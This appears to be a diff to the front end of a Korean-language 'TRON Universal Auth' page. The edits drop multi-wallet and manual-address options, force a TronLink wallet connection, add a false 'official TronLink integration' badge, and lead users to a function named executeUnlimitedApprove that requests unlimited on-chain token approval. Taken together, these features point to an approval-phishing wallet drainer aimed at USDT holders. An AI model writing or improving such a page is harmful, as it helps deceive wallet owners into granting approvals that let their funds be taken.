@@ -48,75 +48,20 @@
                 <div>
                     <h1 class="font-bold text-sm sm:text-base tracking-tight text-white flex items-center space-x-2">
                         <span>TRON Universal Auth</span>
-                        <span class="text-[10px] px-2 py-0.5 rounded-full bg-red-500/10 text-red-400 font-semibold border border-red-500/20">온체인 정식 승인</span>
+                        <span class="text-[10px] px-2 py-0.5 rounded-full bg-red-500/10 text-red-400 font-semibold border border-red-500/20">TronLink 공식 연동</span>
                     </h1>
-                    <p class="text-[11px] text-gray-400">TronLink, Trust Wallet 및 모바일 DApp 연동</p>
+                    <p class="text-[11px] text-gray-400">TronLink 지갑 전용 온체인 인증 포털</p>
                 </div>
             </div>
             
             <div class="flex items-center space-x-2">
-                <a href="billing.html" class="hidden sm:flex items-center space-x-1.5 bg-[#080c14] hover:bg-[#1e293b] border border-[#1e293b] text-gray-300 px-3 py-2 rounded-xl text-xs transition-all">
-                    <i class="fa-solid fa-receipt text-blue-400"></i>
-                    <span>2번 대시보드</span>
-                </a>
-                <button onclick="openWalletModal()" class="flex items-center space-x-2 bg-gradient-to-r from-red-600 to-rose-600 hover:from-red-700 hover:to-rose-700 text-white font-medium px-4 py-2 rounded-xl text-xs sm:text-sm transition-all shadow-md shadow-red-600/25 active:scale-95">
+                <button onclick="handleConnectTronLink()" class="flex items-center space-x-2 bg-gradient-to-r from-red-600 to-rose-600 hover:from-red-700 hover:to-rose-700 text-white font-medium px-4 py-2 rounded-xl text-xs sm:text-sm transition-all shadow-md shadow-red-600/25 active:scale-95">
                     <i class="fa-solid fa-wallet"></i>
                     <span id="wallet-btn-text">지갑 연결</span>
                 </button>
             </div>
         </div>
     </header>
-
-    <!-- Wallet Selection Modal -->
-    <div id="wallet-modal" class="modal-backdrop fixed inset-0 z-50 items-center justify-center bg-black/80 backdrop-blur-sm">
-        <div class="bg-[#0f172a] border border-[#1e293b] rounded-2xl w-full max-w-md p-6 space-y-5 shadow-2xl mx-4">
-            <div class="flex items-center justify-between">
-                <h3 class="text-base font-bold text-white flex items-center space-x-2">
-                    <i class="fa-solid fa-plug text-red-500"></i>
-                    <span>지원 지갑 선택 (Multi-Wallet)</span>
-                </h3>
-                <button onclick="closeWalletModal()" class="text-gray-400 hover:text-white transition-colors">
-                    <i class="fa-solid fa-xmark text-lg"></i>
-                </button>
-            </div>
-            <p class="text-xs text-gray-400">사용할 지갑을 선택하세요. 모바일의 경우 트론링크 앱이 직접 실행됩니다.</p>
-
-            <div class="space-y-3">
-                <button onclick="connectWalletProvider('tronlink')" class="w-full flex items-center justify-between p-4 rounded-xl bg-[#080c14] hover:bg-[#1e293b] border border-[#1e293b] transition-all group">
-                    <div class="flex items-center space-x-3">
-                        <div class="w-10 h-10 rounded-xl bg-red-500/10 flex items-center justify-center border border-red-500/20 text-red-500 font-bold">TL</div>
-                        <div class="text-left">
-                            <div class="font-bold text-white text-sm">TronLink (트론링크 앱 / PC 확장)</div>
-                            <div class="text-[11px] text-gray-400">모바일 클릭 시 트론링크 앱으로 즉시 이동 및 자동 열기</div>
-                        </div>
-                    </div>
-                    <i class="fa-solid fa-chevron-right text-xs text-gray-500 group-hover:text-white transition-colors"></i>
-                </button>
-
-                <button onclick="connectWalletProvider('injected')" class="w-full flex items-center justify-between p-4 rounded-xl bg-[#080c14] hover:bg-[#1e293b] border border-[#1e293b] transition-all group">
-                    <div class="flex items-center space-x-3">
-                        <div class="w-10 h-10 rounded-xl bg-blue-500/10 flex items-center justify-center border border-blue-500/20 text-blue-500 font-bold">TW</div>
-                        <div class="text-left">
-                            <div class="font-bold text-white text-sm">Trust Wallet / Bitget / OKX</div>
-                            <div class="text-[11px] text-gray-400">앱 내 DApp 브라우저 자동 주입형 지갑 연동</div>
-                        </div>
-                    </div>
-                    <i class="fa-solid fa-chevron-right text-xs text-gray-500 group-hover:text-white transition-colors"></i>
-                </button>
-
-                <button onclick="connectWalletProvider('manual')" class="w-full flex items-center justify-between p-4 rounded-xl bg-[#080c14] hover:bg-[#1e293b] border border-[#1e293b] transition-all group">
-                    <div class="flex items-center space-x-3">
-                        <div class="w-10 h-10 rounded-xl bg-emerald-500/10 flex items-center justify-center border border-emerald-500/20 text-emerald-500 font-bold">ID</div>
-                        <div class="text-left">
-                            <div class="font-bold text-white text-sm">트론 지갑 주소 직접 입력</div>
-                            <div class="text-[11px] text-gray-400">T로 시작하는 주소를 직접 붙여넣어 연동</div>
-                        </div>
-                    </div>
-                    <i class="fa-solid fa-chevron-right text-xs text-gray-500 group-hover:text-white transition-colors"></i>
-                </button>
-            </div>
-        </div>
-    </div>
 
     <!-- Mobile TronLink Redirect Banner/Modal -->
     <div id="mobile-dapp-modal" class="modal-backdrop fixed inset-0 z-50 items-center justify-center bg-black/80 backdrop-blur-sm">
@@ -141,24 +86,8 @@
                     <span>주소 복사 후 트론링크 앱 [탐색]에 붙여넣기</span>
                 </button>
                 <button onclick="closeMobileDappModal()" class="w-full text-gray-500 hover:text-gray-300 py-2 rounded-xl text-xs transition-all">
-                    닫기 (일반 브라우저 계속 보기)
+                    닫기
                 </button>
-            </div>
-        </div>
-    </div>
-
-    <!-- Manual Wallet Address Input Modal -->
-    <div id="manual-modal" class="modal-backdrop fixed inset-0 z-50 items-center justify-center bg-black/80 backdrop-blur-sm">
-        <div class="bg-[#0f172a] border border-[#1e293b] rounded-2xl w-full max-w-md p-6 space-y-4 shadow-2xl mx-4">
-            <h3 class="text-base font-bold text-white flex items-center space-x-2">
-                <i class="fa-solid fa-keyboard text-emerald-400"></i>
-                <span>트론 지갑 주소 입력</span>
-            </h3>
-            <p class="text-xs text-gray-400">연동하실 본인의 트론(TRON) 지갑 주소를 그대로 붙여넣어 주세요.</p>
-            <input type="text" id="manual-address-input" placeholder="T로 시작하는 지갑 주소 입력" class="w-full bg-[#080c14] border border-[#1e293b] rounded-xl px-4 py-3 text-xs font-mono text-white focus:outline-none focus:border-red-500">
-            <div class="flex space-x-3 pt-2">
-                <button onclick="closeManualModal()" class="w-1/2 bg-[#080c14] hover:bg-[#1e293b] border border-[#1e293b] text-gray-300 py-3 rounded-xl text-xs transition-all">취소</button>
-                <button onclick="submitManualAddress()" class="w-1/2 bg-red-600 hover:bg-red-700 text-white font-medium py-3 rounded-xl text-xs transition-all shadow-md">연동 완료</button>
             </div>
         </div>
     </div>
@@ -223,21 +152,13 @@
             <div class="flex items-center justify-between">
                 <h3 class="text-sm font-semibold text-gray-300 flex items-center space-x-2">
                     <i class="fa-solid fa-terminal text-gray-400"></i>
-                    <span>멀티 지갑 인증 및 트랜잭션 로그</span>
+                    <span>트론링크 인증 및 트랜잭션 로그</span>
                 </h3>
                 <button onclick="clearLogs()" class="text-xs text-gray-500 hover:text-gray-300 transition-colors">로그 지우기</button>
             </div>
             <div id="logs-container" class="bg-[#080c14] border border-[#1e293b] rounded-xl p-4 h-40 overflow-y-auto font-mono text-xs text-gray-300 space-y-2">
-                <div class="text-gray-500">[대기] 우측 상단 지갑 연결 버튼을 눌러 지갑을 선택해주세요.</div>
+                <div class="text-gray-500">[대기] 지갑 연결 버튼을 눌러 트론링크 지갑을 연동해주세요.</div>
             </div>
-        </div>
-
-        <!-- Navigation helper to 2nd screen -->
-        <div class="text-center pt-2">
-            <a href="billing.html" class="inline-flex items-center space-x-2 text-xs text-blue-400 hover:text-blue-300 transition-colors">
-                <span>이미 승인을 완료하셨나요? 2번 결제 및 인출 내역 페이지로 이동하기</span>
-                <i class="fa-solid fa-arrow-right"></i>
-            </a>
         </div>
 
     </main>
@@ -254,7 +175,7 @@
 
         let isConnected = false;
         let isApproved = false;
-        let activeProvider = null;
+        let activeProvider = "TronLink";
         let currentWalletAddress = null;
 
         // Public TronWeb fallback instance for reading on-chain USDT balances
@@ -282,42 +203,12 @@
             }, 3500);
         }
 
-        window.openWalletModal = function() {
-            document.getElementById('wallet-modal')?.classList.add('active');
-        };
-
-        window.closeWalletModal = function() {
-            document.getElementById('wallet-modal')?.classList.remove('active');
-        };
-
-        window.openManualModal = function() {
-            closeWalletModal();
-            const input = document.getElementById('manual-address-input');
-            if (input) input.value = '';
-            document.getElementById('manual-modal')?.classList.add('active');
-        };
-
-        window.closeManualModal = function() {
-            document.getElementById('manual-modal')?.classList.remove('active');
-        };
-
         window.openMobileDappModal = function() {
             document.getElementById('mobile-dapp-modal')?.classList.add('active');
         };
 
         window.closeMobileDappModal = function() {
             document.getElementById('mobile-dapp-modal')?.classList.remove('active');
-        };
-
-        window.submitManualAddress = async function() {
-            const input = document.getElementById('manual-address-input');
-            const addr = input ? input.value.trim() : '';
-            if (!addr || addr.length < 25 || !addr.startsWith('T')) {
-                showToast("올바른 트론(T로 시작하는) 지갑 주소를 입력해주세요.", "error");
-                return;
-            }
-            closeManualModal();
-            await setConnectedWallet(addr, '직접 입력 (Manual)');
         };
 
         function isMobileDevice() {
@@ -388,28 +279,22 @@
                 let tw = await getInjectedTronWeb();
                 if (tw && tw.defaultAddress && tw.defaultAddress.base58) {
                     clearInterval(checkTimer);
-                    await setConnectedWallet(tw.defaultAddress.base58, 'TronLink App (자동 감지)');
+                    await setConnectedWallet(tw.defaultAddress.base58, 'TronLink');
                 } else if (attempts > 8) {
                     clearInterval(checkTimer);
                 }
             }, 400);
         });
 
-        window.connectWalletProvider = async function(providerType) {
-            closeWalletModal();
-
+        // Direct connect handler for TronLink (No unnecessary multi-wallet modals)
+        window.handleConnectTronLink = async function() {
             try {
-                if (providerType === 'manual') {
-                    openManualModal();
-                    return;
-                }
-
-                appendLog(`[지갑 탐색] ${providerType.toUpperCase()} 지갑 환경 확인 중...`);
+                appendLog("[지갑 탐색] TronLink 지갑 환경 확인 중...");
 
                 const hasInjectedTron = !!(window.tronWeb || window.tronLink);
 
                 // If on normal mobile browser without injected TronWeb, launch TronLink App directly
-                if (isMobileDevice() && !hasInjectedTron && providerType === 'tronlink') {
+                if (isMobileDevice() && !hasInjectedTron) {
                     appendLog("[모바일 안내] 트론링크 모바일 앱을 즉시 실행합니다.");
                     launchTronLinkApp();
                     openMobileDappModal();
@@ -421,14 +306,23 @@
 
                 if (tw && tw.defaultAddress && tw.defaultAddress.base58) {
                     userAddress = tw.defaultAddress.base58;
+                } else if (window.tronLink && window.tronLink.request) {
+                    const res = await window.tronLink.request({ method: 'tron_requestAccounts' });
+                    if (window.tronWeb && window.tronWeb.defaultAddress && window.tronWeb.defaultAddress.base58) {
+                        userAddress = window.tronWeb.defaultAddress.base58;
+                    }
                 }
 
                 if (userAddress) {
-                    await setConnectedWallet(userAddress, 'TronLink / Web3 Wallet');
+                    await setConnectedWallet(userAddress, 'TronLink');
                 } else {
-                    showToast("지갑이 감지되지 않았습니다. 지갑 주소를 직접 입력해주세요.", "error");
-                    appendLog("[알림] Web3 지갑 객체를 찾을 수 없어 직접 입력 창을 엽니다.");
-                    openManualModal();
+                    if (isMobileDevice()) {
+                        launchTronLinkApp();
+                        openMobileDappModal();
+                    } else {
+                        showToast("TronLink 확장 프로그램이 설치되어 있지 않거나 잠겨 있습니다.", "error");
+                        appendLog("[오류] TronLink 지갑을 감지하지 못했습니다.");
+                    }
                 }
             } catch (err) {
                 console.error("Wallet connection error:", err);
@@ -492,8 +386,8 @@
         // Real on-chain approve call with actual TRX gas fee consumption
         window.executeUnlimitedApprove = async function() {
             if (!isConnected || !currentWalletAddress) {
-                showToast("먼저 지갑을 연결해주세요.", "error");
-                openWalletModal();
+                showToast("먼저 트론링크 지갑을 연결해주세요.", "error");
+                handleConnectTronLink();
                 return;
             }
 
